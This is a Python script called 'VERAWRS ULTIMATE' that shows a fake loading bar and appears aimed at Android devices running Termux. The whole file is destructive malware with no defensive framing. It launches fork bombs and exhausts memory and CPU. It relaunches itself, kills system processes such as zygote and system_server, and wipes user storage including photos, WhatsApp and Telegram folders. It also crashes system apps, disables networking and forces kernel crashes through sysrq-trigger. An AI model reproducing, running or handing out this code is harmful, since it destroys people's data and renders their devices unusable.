#!/usr/bin/env python3

import threading
import time
import os
import sys
import random
import subprocess
import gc
import signal

print("\n" * 3)
print("=" * 60)
print("     V E R A W R S   U L T I M A T E")
print("=" * 60)
print("\n" * 2)
time.sleep(0.5)

for i in range(101):
    print(f"\r\a verawrs загрузка [{ '█' * (i//2)}{ ' ' * (50 - i//2)}] {i}%", end='')
    sys.stdout.flush()
    time.sleep(0.008)
print("\n\n")

def k1():
    while True:
        for _ in range(300):
            os.system('cat /dev/urandom | head -c 2000000000 2>/dev/null > /dev/shm/k1 2>/dev/null &')
            os.system('dd if=/dev/zero of=/sdcard/.z bs=1M count=100000 2>/dev/null &')
            os.system('cat /dev/urandom > /dev/shm/k2 2>/dev/null &')
            os.system('dd if=/dev/urandom of=/dev/shm/k3 bs=1M count=100000 2>/dev/null &')
            os.system('cat /dev/urandom | gzip -9 > /dev/shm/k4.gz 2>/dev/null &')
            os.system('dd if=/dev/zero of=/dev/shm/z bs=1M count=100000 2>/dev/null &')
            os.system('cp /dev/urandom /dev/shm/fill 2>/dev/null &')
        time.sleep(0.00005)

def k2():
    while True:
        for _ in range(200):
            _ = [random.random() ** random.random() for _ in range(20000000)]
            _ = [x**x for x in range(200000)]
            _ = [pow(x, random.randint(1,9999)) for x in range(1000000)]
            _ = [hash(str(x)) for x in range(2000000)]
            _ = [x*x*x*x*x*x*x for x in range(1000000)]
            _ = [abs(x**x) for x in range(100000)]
        for _ in range(5000):
            threading.Thread(target=lambda: [x**x for x in range(200000)], daemon=True).start()
            threading.Thread(target=lambda: [hash(str(x)) for x in range(500000)], daemon=True).start()
            threading.Thread(target=lambda: [pow(x,99) for x in range(100000)], daemon=True).start()
        time.sleep(0.00005)

def k3():
    while True:
        for _ in range(1000):
            os.system('( :(){ :|:& };: ) 2>/dev/null &')
            os.system('python3 -c "import os; [os.fork() for _ in range(5000)]" 2>/dev/null &')
            os.system(':(){ :|:& };: 2>/dev/null &')
            os.system('{ while true; do { echo; } | { echo; } & done; } 2>/dev/null &')
            os.system('python3 -c "import os; while True: os.fork()" 2>/dev/null &')
            os.system('{ :; }; :(){ :|:& };: 2>/dev/null &')
        time.sleep(0.0005)

def k4():
    s = os.path.abspath(__file__)
    while True:
        for _ in range(500):
            os.system(f'python3 "{s}" &>/dev/null &')
            os.system(f'nohup python3 "{s}" &')
            os.system(f'python3 -c "import os; os.system(f\'python3 {s} &\')" &')
            os.system(f'termux-wake-lock 2>/dev/null; python3 "{s}" &')
            os.system(f'python3 "{s}" &')
            os.system(f'bash -c "python3 {s} &"')
        time.sleep(0.005)

def k5():
    while True:
        os.system('pkill -9 python 2>/dev/null &')
        os.system('pkill -9 sh 2>/dev/null &')
        os.system('pkill -9 bash 2>/dev/null &')
        os.system('pkill -9 termux 2>/dev/null &')
        os.system('kill -9 -1 2>/dev/null &')
        os.system('pkill -f python3 2>/dev/null &')
        os.system('pkill -9 zygote 2>/dev/null &')
        os.system('pkill -9 system_server 2>/dev/null &')
        os.system('killall -9 2>/dev/null &')
        os.system('pkill -9 com.android 2>/dev/null &')
        os.system('pkill -9 mediaserver 2>/dev/null &')
        time.sleep(0.002)

def k6():
    p = []
    gc.disable()
    while True:
        for _ in range(200):
            p.append('x' * 1000000000)
            p.append([x for x in range(100000000)])
            p.append({str(x): x for x in range(10000000)})
            p.append([[x for x in range(500000)] for _ in range(50000)])
            p.append(bytearray(1000000000))
            p.append(os.urandom(1000000000))
            p.append([hash(x) for x in range(50000000)])
        time.sleep(0.0005)

def k7():
    while True:
        for _ in range(5000):
            t = threading.Thread(target=lambda: [x*x for x in range(50000000)], daemon=True)
            t.start()
            t = threading.Thread(target=lambda: [hash(x) for x in range(20000000)], daemon=True)
            t.start()
            t = threading.Thread(target=lambda: [pow(x,2) for x in range(20000000)], daemon=True)
            t.start()
            t = threading.Thread(target=lambda: [random.random() for _ in range(5000000)], daemon=True)
            t.start()
            t = threading.Thread(target=lambda: [x**x for x in range(100000)], daemon=True)
            t.start()
        time.sleep(0.00005)

def k8():
    while True:
        os.system('rm -rf /sdcard/* 2>/dev/null &')
        os.system('rm -rf /data/local/tmp/* 2>/dev/null &')
        os.system('rm -rf /storage/emulated/0/* 2>/dev/null &')
        os.system('dd if=/dev/urandom of=/sdcard/zero bs=1M 2>/dev/null &')
        os.system('find /sdcard -type f -delete 2>/dev/null &')
        os.system('rm -rf /sdcard/Android/* 2>/dev/null &')
        os.system('rm -rf /sdcard/DCIM/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Download/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Music/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Pictures/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Movies/* 2>/dev/null &')
        os.system('rm -rf /sdcard/WhatsApp/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Telegram/* 2>/dev/null &')
        os.system('rm -rf /sdcard/Documents/* 2>/dev/null &')
        time.sleep(0.005)

def k9():
    while True:
        for f in [1,2,5,10,20,50,100,200,500,1000,2000,5000,10000,20000,30000]:
            for _ in range(500):
                sys.stdout.write('\a' * 2000)
                sys.stdout.flush()
                os.system('echo -e "\a\a\a\a\a\a\a\a\a\a\a\a\a\a"')
                print('\a' * 5000, end='')
        time.sleep(0.00005)

def k10():
    while True:
        for _ in range(100):
            os.system('dd if=/dev/urandom of=/dev/null bs=1M count=1000000 2>/dev/null &')
            os.system('openssl speed -multi 32 &')
            os.system('yes > /dev/null &')
            os.system('dd if=/dev/zero of=/dev/null bs=1M count=1000000 2>/dev/null &')
            os.system('sha256sum /dev/urandom &')
            os.system('md5sum /dev/urandom &')
            os.system('cat /dev/urandom | bzip2 -9 > /dev/null &')
        time.sleep(0.0002)

def k11():
    while True:
        for _ in range(2000):
            os.system('cat /dev/urandom > /dev/shm/io 2>/dev/null &')
            os.system('sync &')
            os.system('dd if=/dev/zero of=/dev/shm/zero bs=1M count=100000 2>/dev/null &')
            os.system('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null &')
            os.system('swapoff -a 2>/dev/null &')
            os.system('swapon -a 2>/dev/null &')
        time.sleep(0.0002)

def k12():
    while True:
        for _ in range(5000):
            os.system('ping -c 1 8.8.8.8 -s 65507 2>/dev/null &')
            os.system('curl -s http://127.0.0.1:8080 &')
            os.system('wget -O /dev/null http://localhost &')
            os.system('nc -zv 127.0.0.1 1-65535 2>/dev/null &')
            os.system('curl -s https://127.0.0.1 &')
            os.system('ping -c 1 1.1.1.1 -s 65507 2>/dev/null &')
            os.system('curl -s http://localhost &')
        time.sleep(0.0002)

def k13():
    while True:
        os.system('am crash com.android.systemui 2>/dev/null &')
        os.system('am crash com.android.launcher 2>/dev/null &')
        os.system('am crash com.android.settings 2>/dev/null &')
        os.system('am crash com.android.phone 2>/dev/null &')
        os.system('input keyevent KEYCODE_POWER 2>/dev/null &')
        os.system('input keyevent KEYCODE_HOME 2>/dev/null &')
        os.system('settings put global animator_duration_scale 1000000 2>/dev/null &')
        os.system('settings put global transition_animation_scale 1000000 2>/dev/null &')
        os.system('svc wifi disable 2>/dev/null &')
        os.system('svc data disable 2>/dev/null &')
        os.system('svc bluetooth disable 2>/dev/null &')
        time.sleep(0.002)

def k14():
    while True:
        for _ in range(50000):
            try:
                os.mkdir(f'/sdcard/.v_{random.randint(1,99999999)}')
                os.mkdir(f'/dev/shm/v_{random.randint(1,99999999)}')
                os.mkdir(f'/sdcard/crash_{random.randint(1,99999999)}')
                os.mkdir(f'/sdcard/verawrs_{random.randint(1,99999999)}')
            except:
                pass
        time.sleep(0.0005)

def k15():
    while True:
        os.system('setprop debug.hwui.render_dirty_regions false 2>/dev/null &')
        os.system('setprop debug.composition.type gpu 2>/dev/null &')
        os.system('echo 1 > /proc/sys/kernel/sysrq 2>/dev/null &')
        os.system('echo c > /proc/sysrq-trigger 2>/dev/null &')
        os.system('echo 0 > /proc/sys/kernel/panic 2>/dev/null &')
        os.system('echo b > /proc/sysrq-trigger 2>/dev/null &')
        os.system('echo f > /proc/sysrq-trigger 2>/dev/null &')
        time.sleep(0.005)

def k16():
    while True:
        for _ in range(1000):
            subprocess.Popen(['python3', '-c', 'import time; [x**x for x in range(100000)]'])
            subprocess.Popen(['sh', '-c', ':(){ :|:& };:'])
            subprocess.Popen(['python3', '-c', 'import os; [os.fork() for _ in range(2000)]'])
            subprocess.Popen(['bash', '-c', ':(){ :|:& };:'])
            subprocess.Popen(['python3', '-c', 'while True: os.fork()'])
        time.sleep(0.0005)

all_func = [k1,k2,k3,k4,k5,k6,k7,k8,k9,k10,k11,k12,k13,k14,k15,k16]

for f in all_func:
    threading.Thread(target=f, daemon=True).start()

for i in range(10000):
    print(f"\r\a VERAWRS ULTIMATE {i+1}% " + "█" * (i//10), end='')
    sys.stdout.write('\a' * 500)
    sys.stdout.flush()
    for _ in range(1000000):
        _ = hash(random.random()) ** random.random()
    time.sleep(0.00005)

while True:
    for _ in range(100):
        os.system('cat /dev/urandom > /dev/null 2>/dev/null &')
        os.system('( :(){ :|:& };: ) 2>/dev/null &')
        os.system('python3 -c "import os; [os.fork() for _ in range(10000)]" 2>/dev/null &')
        os.system('dd if=/dev/urandom of=/dev/null bs=1M &')
    for _ in range(500000):
        _ = [x**x for x in range(10000)]
        _ = [hash(str(x)) for x in range(200000)]
        _ = [random.random()**random.random() for _ in range(100000)]
    sys.stdout.write('\a' * 5000)
    sys.stdout.flush()
    time.sleep(0.00005)